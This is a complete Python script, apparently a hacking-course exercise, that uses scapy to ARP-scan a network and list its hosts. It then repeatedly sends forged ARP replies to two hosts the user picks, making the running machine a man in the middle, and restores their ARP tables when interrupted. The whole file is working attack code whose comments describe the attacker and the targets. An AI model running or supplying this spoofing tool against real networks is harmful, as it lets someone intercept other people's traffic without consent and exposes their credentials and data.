#!/usr/bin/env python

import time
import scapy.all as scapy
import argparse

# function to get the command line arguments and set the help options
def getcmd_args():
    cmd_parser = argparse.ArgumentParser()
    cmd_parser.add_argument("-n", "--network", dest="target_net", help="Target network range or individual ip address to scan")
    options = cmd_parser.parse_args()
    return options

# function to scan a target network range for responsive machines and return a target list
def scan (ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Combine sections into one request
    arp_request_broadcast = broadcast/arp_request

    #Send packet with custom Ethernet framce and capture responses in variables responsive_list and unresponsive_list
    responsive_list, unresponsive_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)

    target_list = []
    count = 0
    # Iterate over responsive_list returned from scapy.srp and return a target list
    for item in responsive_list:
        target_dict = {"index": count, "ip": item[1].psrc, "mac": item[1].hwsrc}
        target_list.append(target_dict)
        count += 1
    return target_list

# function to spoof a machine's MAC address in a target's ARP table
def arp_spoof(tgt_ip, tgt_mac, spoof_ip):
    #craft and send an ARP response to the target associating the attacker machine's MAC with the spoofed machines IP
    packet = scapy.ARP(op=2, pdst=tgt_ip, hwdst=tgt_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# function to restore the target machine's ARP table
def arp_restore(tgt_ip, tgt_mac, src_ip, src_mac):
    # craft and send an ARP response to the target associating the re-associating spoofed machines IP and MAC
    packet = scapy.ARP(op=2, pdst=tgt_ip, hwdst=tgt_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=5, verbose=False)

# Function to parse and print target machine list
def print_output(results_list):
    print("--------------------------------------------------")
    print("Index\tIP\t\t\tAt MAC Address")
    print("--------------------------------------------------")
    for target in results_list:
        print(str(target["index"]) + "\t" + target["ip"] + "\t\t" + target["mac"])


cmd_options = getcmd_args()
scan_result = scan(cmd_options.target_net)
print_output(scan_result)

# Solicit user input for target machines to spoof on network
print()
tgt_index1 = input("Enter index of first target to spoof > ")
tgt_index2 = input("Enter index of second target to spoof > ")

targetip1 = scan_result[int(tgt_index1)]["ip"]
targetmac1 = scan_result[int(tgt_index1)]["mac"]

targetip2 = scan_result[int(tgt_index2)]["ip"]
targetmac2 = scan_result[int(tgt_index2)]["mac"]

print("Spoofing targets: ")
packet_count = 0
try:
    # spoof two target machines and turn attacker machine into a Man in the Middle
    while True:
        packet_count = packet_count + 2
        arp_spoof(targetip1, targetmac1, targetip2)
        arp_spoof(targetip2, targetmac2, targetip1)
        print("\r[+] Packets sent: " + str(packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    # restore target machine's ARP tables
    print("[+] Detected User input CTRL + C ...... Restoring target ARP tables")
    arp_restore(targetip1, targetmac1, targetip2, targetmac2)
    arp_restore(targetip2, targetmac2, targetip1, targetmac1)